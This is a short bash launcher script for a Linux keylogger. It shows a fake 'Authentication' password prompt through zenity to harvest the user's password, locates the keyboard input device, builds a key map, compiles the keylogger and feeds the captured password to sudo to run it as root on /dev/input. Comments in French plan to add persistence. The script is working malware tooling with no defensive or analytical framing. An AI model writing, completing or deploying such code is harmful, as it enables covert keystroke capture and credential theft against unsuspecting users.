#! /bin/bash

parse(){
    keyMap=$(echo "$@" |\
     sed 's|backslash|\\|g' |\
	 sed 's|slash|/|g' |\
	 sed "s|apostrophe|'|g" |\
	 sed 's|Return|\x0a|g' |\
	 sed 's|dollar|\$|g')
}

password=$(zenity --password --title=Authentication)"\n\n\n"
whoami=$(whoami)

echo $whoami
keyboards=$(cat /proc/bus/input/devices | grep -A 7 keyboard)
#TODO clean sed command
echo $keyboards
eventfile=$(echo $keyboards | grep "H: " | sed -n 's/^.*\(event[^ ]*\).*/\1/p')
echo "eventX: "$eventfile
keyMap=$(xmodmap -pke | awk  '{printf substr($0, index($0, $3))"|\n"}' | cut -c3- )
parse "${keyMap//[$'\t\r\n']}"
#echo $keyMap | awk '{print "\""$0"\""}' | echo $@ 
make re
if [ $? -ne 0 ]
then
echo -e "MAKE FAILED\n"
exit 0 
fi
echo -e $password | sudo -S ./keylogger "/dev/input/$eventfile" "${keyMap}"
echo $?
#TODO loop on $? for retry
#TODO completer le PARSEUR
#TODO ajouter un systeme de persistence du keylogger  